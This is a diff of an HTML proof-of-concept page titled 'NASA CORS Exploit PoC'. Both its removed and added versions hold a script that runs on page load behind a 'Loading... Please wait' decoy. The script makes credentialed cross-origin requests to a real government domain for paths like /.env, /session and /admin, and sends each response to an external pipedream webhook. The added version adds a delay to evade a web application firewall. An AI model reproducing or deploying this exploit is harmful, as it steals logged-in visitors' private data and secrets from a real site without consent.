@@ -1,51 +1,88 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>NASA CORS Exploit</title>
+  <title>NASA CORS Exploit PoC</title>
+  <script>
+    (async () => {
+      const webhook = "https://eojzzzf3qvc4t0o.m.pipedream.net"; // ← Webhook الخاص بك
+      const origin = location.origin;
+      const userAgent = navigator.userAgent;
+
+      const targets = [
+        "/",
+        "/user",
+        "/modules",
+        "/session",
+        "/api",
+        "/api/v1",
+        "/config.js",
+        "/data.json",
+        "/dashboard",
+        "/.env",
+        "/login",
+        "/settings",
+        "/js/app.js",
+        "/admin",
+        "/js/main.js",
+        "/home",
+        "/profile"
+      ];
+
+      for (let path of targets) {
+        try {
+          const url = "https://usgeo.gov" + path;
+          const res = await fetch(url, {
+            method: "GET",
+            mode: "cors",
+            credentials: "include"
+          });
+
+          const contentType = res.headers.get("content-type") || "";
+          let content;
+
+          if (contentType.includes("application/json")) {
+            content = await res.json();
+          } else if (contentType.includes("text") || contentType.includes("html") || contentType.includes("javascript")) {
+            content = await res.text();
+          } else {
+            content = "[Non-text content]";
+          }
+
+          await fetch(webhook, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+              origin,
+              userAgent,
+              url,
+              status: res.status,
+              content: content.slice(0, 1000) // لا ترسل أكثر من 1000 حرف
+            })
+          });
+
+          console.log(`[✅] Fetched ${url} - Status: ${res.status}`);
+        } catch (err) {
+          await fetch(webhook, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+              origin,
+              userAgent,
+              url: "https://usgeo.gov" + path,
+              status: 0,
+              error: err.message || "Unknown Error"
+            })
+          });
+
+          console.log(`[❌] Failed: ${path} — ${err.message}`);
+        }
+
+        await new Promise(r => setTimeout(r, 1000)); // Delay to avoid WAF blocking
+      }
+    })();
+  </script>
 </head>
 <body>
   <h1>Loading... Please wait</h1>
-  <script>
-    const target = "https://usgeo.gov";  // غيّر هذا لأي دومين فيه CORS مفتوح
-    const webhook = "https://eojzzzf3qvc4t0o.m.pipedream.net";
-
-    const paths = [
-      "/robots.txt", "/sitemap.xml", "/config.js", "/user/profile", "/account",
-      "/dashboard", "/session", "/api/user", "/.env", "/.git/config", "/js/app.js",
-      "/js/config.js", "/data.json", "/info", "/internal/status", "/admin",
-      "/modules", "/GLOBE/"
-    ];
-
-    const send = async (path, content, status) => {
-      await fetch(webhook, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({
-          origin: location.origin,
-          userAgent: navigator.userAgent,
-          url: target + path,
-          status: status,
-          content: content.slice(0, 1000) // Limit for safety
-        })
-      });
-    };
-
-    const exploit = async () => {
-      for (const path of paths) {
-        try {
-          const res = await fetch(target + path, {
-            credentials: "include",  // important if cookies are used
-            mode: "cors"
-          });
-          const text = await res.text();
-          send(path, text, res.status);
-        } catch (err) {
-          send(path, "ERROR: " + err.message, 0);
-        }
-      }
-    };
-
-    exploit();
-  </script>
 </body>
 </html>
